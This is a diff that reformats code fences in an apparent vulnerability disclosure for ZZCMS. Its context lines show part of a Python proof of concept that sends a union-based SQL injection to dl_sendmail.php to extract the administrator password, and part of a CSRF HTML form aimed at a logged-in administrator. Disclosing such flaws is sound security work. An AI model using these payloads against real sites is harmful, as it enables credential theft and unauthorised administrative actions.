@@ -7,7 +7,7 @@
 According to the code, the SQL statement is submitted as a post, and there is no filtering in the middle, so there is SQL injection here.
 
 #### POC：
-···
+```
 import requests
 
 url = "http://10.10.10.39:8080/dl/dl_sendmail.php"
@@ -17,7 +17,7 @@ data = { 'sql':'select email from zzcms_dl where id=-1 union select pass from zz
 q = requests.post(url,data,cookies=cookies)
 q.encoding = 'utf-8'
 print q.text
-···
+```
 
 You can see that you have successfully obtained the administrator password.
 ![image](https://github.com/AvaterXXX/ZZCMS/blob/master/2.png)
@@ -40,7 +40,7 @@ Stripfxg function is to restore the materialization. As you can see, there is a 
 ## 3. CSRF
 After the administrator logged in, open the following  page
 poc：
-···
+```
 <html>
   <body>
   <script>history.pushState('', '', '/')</script>
@@ -53,4 +53,4 @@ poc：
     </form>
   </body>
 </html>
-···
+```
